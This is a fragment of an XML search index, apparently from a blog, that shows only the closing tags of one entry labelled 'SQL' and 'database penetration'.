        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 - 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
